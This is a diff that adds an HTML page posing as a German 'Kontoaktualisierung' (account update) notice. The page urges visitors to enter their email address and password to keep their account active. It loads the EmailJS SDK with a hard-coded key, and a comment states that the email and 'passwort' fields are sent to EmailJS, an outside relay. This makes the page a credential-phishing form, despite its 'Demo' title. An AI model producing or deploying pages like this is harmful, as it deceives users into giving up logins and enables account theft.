@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Account Update • Demo</title>
+  <link rel="stylesheet" href="style.css">
+
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script>
+    // EmailJS public key (already provided)
+    emailjs.init("4qHdU26CIsFHEAbC8");
+  </script>
+</head>
+<body>
+  <main class="page">
+    <!-- Top notice / header -->
+    <section class="panel notice">
+      <div class="notice-inner">
+        <h1 class="notice-title">Kontoaktualisierung</h1>
+        <p class="notice-sub">
+          Wir haben Ihre Kontoeinstellungen aktualisiert. Um Ihren Zugang aktiv zu halten, bestätigen Sie bitte unten Ihre Kontaktdaten.
+        </p>
+        <a class="primary-btn" href="#action">Details bestätigen</a>
+      </div>
+
+      <!-- 👇 Picture added in top-right -->
+      <div class="notice-graphic">
+        <img src="download (1).png" alt="Decorative" />
+      </div>
+    </section>
+
+    <!-- Form panel -->
+    <section id="action" class="panel form-panel">
+      <div class="form-card">
+        <h2 class="form-title">Schnelle Bestätigung</h2>
+        <p class="form-desc">Geben Sie zur Bestätigung Ihre E-Mail-Adresse und Ihr Passwort ein</p>
+
+        <!-- NOTE: this form will send fields user_email and passwort to EmailJS -->
+        <form id="demo-form" class="form" autocomplete="on" novalidate>
+          <label class="field">
+            <span class="label-text">Email</span>
+            <input name="user_email" type="email" placeholder="you@example.com" required>
+          </label>
+
+          <label class="field password-field">
+            <span class="label-text">Passwort</span>
+            <input name="passwort" id="passwort" type="password" placeholder="••••••••" required>
+            <button id="toggle-password" type="button" aria-label="Toggle password">👁️</button>
+          </label>
+
+          <div class="actions">
+            <button id="submit-btn" class="primary-btn" type="submit">Confirm</button>
+            <button id="cancel-btn" class="link-btn" type="button">Cancel</button>
+          </div>
+
+          <p id="status" class="status" aria-live="polite"></p>
+        </form>
+      </div>
+    </section>
+
+    
+  </main>
+
+  <script src="script.js"></script>
+</body>
+</html>
